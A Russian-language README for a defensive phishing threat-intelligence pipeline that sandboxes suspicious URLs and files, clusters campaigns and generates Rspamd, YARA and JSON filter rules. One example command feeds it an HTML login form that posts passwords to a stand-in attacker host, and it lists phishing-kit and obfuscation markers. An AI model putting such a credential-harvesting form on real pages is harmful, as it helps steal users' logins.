# Phishing Threat Intelligence Pipeline (DW-2)

Двух-агентная система глубокого анализа фишинговых угроз с изоляцией в песочнице, кластеризацией кампаний и автоматической генерацией компактных правил для локального антиспама.

---

## 1. В чём идея проекта?

Традиционная блокировка по IP и доменам устаревает за считанные часы: злоумышленники используют одноразовые домены, многократные редиректы, обфускацию JavaScript, QR-коды и многократное переиспользование одинаковых фишинг-китов (**phishing kits**) на разных адресах.

**Цель проекта (Task.md)** — создать конвейер глубокого анализа (Threat Intelligence Pipeline), который:
1. Принимает на вход подозрительные образцы: URL, HTML, документы (PDF, DOCX, XLSX, EML), изображения с QR-кодами, архивы.
2. Безопасно запускает активную разведку и сбор данных в изолированной песочнице.
3. Проводит глубокий семантический анализ с помощью тяжеловесных моделей и экстракторов:
   - **Visual Brand Impersonation** (подход Phishpedia) — визуальное распознавание бренда через VLM и проверка Domain Mismatch (175 целевых брендов + Open-Set детекция).
   - **DOM Skeleton & SimHash** — токенизация остова тегов, криптографический `dom_hash` и нечеткий `SimHash` для детекции одинаковых landing pages независимо от домена и текста.
   - **Глубокий аудит форм** — детекция кросс-доменных POST, учетных форм и прямых C2-вебхуков (Telegram Bot API, Discord).
   - **Детектор обфускации** — энтропия Шеннона (>5.2), упаковщики (Dean Edwards, JSFuck, `eval(atob)`), маркеры фишинг-китов (`antibot.php`, `/logs.txt`, `/victim.txt`).
   - **Favicon Intelligence** — Dual Hashing: MD5/SHA-256 и перцептивный dHash (distance Хэмминга) с fallback на `/favicon.ico`.
   - **Quishing Defense** — 6-ступенчатый адаптивный каскад очистки QR-кодов от шума на Pillow (медианный фильтр 3x3, бинаризация Оцу, инверсия Dark Mode).
4. Кластеризует атаки в **фишинговые кампании** по связке `[целевой бренд + dom_hash]`.
5. Обобщает знания в **компактные правила и сигнатуры** для легких локальных антиспам-фильтров:
   - **JSON Rulepack** — универсальный пакет признаков со скорингом.
   - **Rspamd Rules** — нативные конфигурации Lua со скорингом и символами.
   - **YARA-сигнатуры** — проверка почтовых вложений и файлов.
   - **Reason Codes** — машиночитаемые структурированные коды (`BRAND_IMPERSONATION_TARGET_SBER`, `CROSS_DOMAIN_CREDENTIAL_THEFT`, `QR_OBFUSCATION_DENOISED_MEDIAN`).

---

## 2. Архитектура безопасности

Система работает в связке двух изолированных Docker-контейнеров:

| Контейнер | Роль | Уровень доверия и безопасность |
|---|---|---|
| **`threat_agents`** | Чистая зона (Brain): LangGraph-агенты, оркестратор, SQLite (`/app/data/analysis.db`), подключение к LLM/VLM по API. | Высокий. Опасный код **не исполняет**. Хранит секреты (`AI_API_KEY`). |
| **`threat_sandbox`** | Грязная зона (Песочница): Playwright Headless Chromium, парсер документов (MarkItDown, PyMuPDF), QR-декодер (Pillow + PyZbar), распаковщик архивов. | Низкий. Исполняет опасный код. `read_only: true`, `cap_drop: ALL`, `no-new-privileges: true`, non-root (`pwuser` UID 1000). **Секретов не видит, порты наружу не публикуются**. |

Связка агентов работает по схеме **Сборщик → Handover → Аналитик**:
1. **Сборщик (`collector_agent`)**: свободный ReAct-цикл обхода ссылок, скачивания файлов, рендеринга и распаковки.
2. **Handover**: детерминированная фиксация и хэширование всех артефактов в SQLite.
3. **Аналитик (`analyst_agent`)**: семантический разбор собранного, VLM-анализ скриншотов, выявление техник и формирование профиля угроз.
4. **Финализация**: расчет остова DOM, кластеризация кампаний, синтез сигнатур.

---

## 3. Быстрый запуск (Docker)

### 3.1. Клонирование / распаковка репозитория
```bash
cd dw-2
```

### 3.2. Настройка файла переменных окружения (`.env`)
Скопируйте пример файла конфигурации:

*Linux / macOS:*
```bash
cp .env.example .env
```

*Windows (PowerShell):*
```powershell
Copy-Item .env.example .env
```

Задайте параметры подключения к LLM/VLM серверу в файле `.env`:
```env
# Подключение к LLM/VLM серверу (OpenAI-совместимый API)
AI_BASE_URL=http://deepcode.ci.nsu.ru/api/chat/completions
AI_API_KEY=ваш_ключ_api

# Модели
DEFAULT_LLM_MODEL=Qwen3.8-27B
DEFAULT_VLM_MODEL=Qwen3.8-27B

# Системные параметры
ENVIRONMENT=development
LOG_LEVEL=INFO
```

### 3.3. Запуск контейнеров
Запустите оба сервиса в фоновом режиме:
```bash
docker compose up -d --build
```

Убедитесь, что оба контейнера находятся в состоянии `Up`:
```bash
docker compose ps
```

Проверьте доступность базы данных и начальную статистику:
```bash
docker exec threat_agents python main.py stats
```

---

## 4. Справочник команд CLI (`main.py`)

Все команды запускаются через `docker exec threat_agents python main.py <команда>`:

### 4.1. Анализ образца (`analyze`)

#### Анализ URL-ссылки:
Сборщик раскроет редирект-цепочку, песочница сделает рендер и скриншот, извлечет DOM-структуру, фавикон и внешние ресурсы. Аналитик определит бренд и сформирует сигнатуры:
```bash
docker exec threat_agents python main.py analyze "https://sber-online-secure-auth.xyz/login" --type url
```

#### Анализ чистого HTML-кода:
```bash
docker exec threat_agents python main.py analyze "<html><body><form action='http://c2-evil.xyz/post' method='POST'><input type='password' name='pass'></form></body></html>" --type html
```

#### Анализ файла / вложения (PDF, HTML, EML, Картинка с QR, Архив):
1. Скопируйте файл с хост-системы в том песочницы:
   ```bash
   docker cp "test_fixtures/phish_bank.html" threat_agents:/app/data/artifacts/sample.html
   ```
2. Запустите анализ:
   ```bash
   docker exec threat_agents python main.py analyze /app/data/artifacts/sample.html --type file
   ```

*(Опционально: добавьте флаг `--json` для получения машиночитаемого вывода).*

---

### 4.2. Просмотр отчетов по образцу (`report`)

```bash
# Человекочитаемый отчет:
docker exec threat_agents python main.py report 1

# Полный JSON со всеми артефактами, findings и сигнатурами:
docker exec threat_agents python main.py report 1 --json
```

---

### 4.3. Просмотр цепочки рассуждений агентов (`trace`)

Показывает протокол работы ReAct-агентов (какие шаги предпринимались, какие инструменты вызывались и какие наблюдения были получены):
```bash
docker exec threat_agents python main.py trace 1
```

Флаги:
- `--full` — не обрезать длинные фрагменты выводов инструментов.
- `--agent collector_agent` или `--agent analyst_agent` — показать шаги только выбранного агента.
- `--json` — вывод трейса в формате JSON.

---

### 4.4. Отслеживание фишинговых кампаний (`campaigns`)

Кластеризация фишинговых атак по совокупности признаков (целевой бренд + структурный остов DOM `dom_hash`):
```bash
docker exec threat_agents python main.py campaigns
```

Формат JSON:
```bash
docker exec threat_agents python main.py campaigns --json
```

---

### 4.5. Генерация и экспорт компактных правил (`export-rules`)

Экспорт накопленной базы признаков в форматы для легких локальных антиспам-фильтров:

#### Универсальный JSON Rulepack
Содержит brand definitions, легитимные домены, регулярные выражения путей, DOM-хэши, Favicon-хэши и весовые коэффициенты (score):
```bash
docker exec threat_agents python main.py export-rules --format json
```
Сохранение в файл:
```bash
docker exec threat_agents python main.py export-rules --format json --out /app/data/rules.json
```

#### Правила Rspamd (Lua + Символы)
Готовые символы со скорингом для почтового фильтра Rspamd:
```bash
docker exec threat_agents python main.py export-rules --format rspamd
```

#### YARA-сигнатуры
Набор правил YARA для проверки почтовых вложений и файлов:
```bash
docker exec threat_agents python main.py export-rules --format yara
```

---

### 4.6. Статистика базы знаний (`stats`)

```bash
docker exec threat_agents python main.py stats
```

---

## 5. Режим «Стерильный анализ» (Clean Sandbox)

Для анализа опасных пэйлоадов предусмотрен скрипт, который пересоздает контейнер песочницы с нуля перед каждым анализом, исключая перекрестное загрязнение:
```bash
# Выполняется на хосте (Git Bash / WSL):
bash scripts/analyze_clean.sh /app/data/artifacts/sample.html --type file
```

Ручной сброс песочницы:
```bash
bash scripts/reset_sandbox.sh
```

---

## 6. Тестирование

### Запуск тестов на хосте (при установленном Python):
```bash
pip install -r requirements.txt
pytest -v
```

### Запуск тестов внутри контейнера:
```bash
docker exec threat_agents pytest -v
```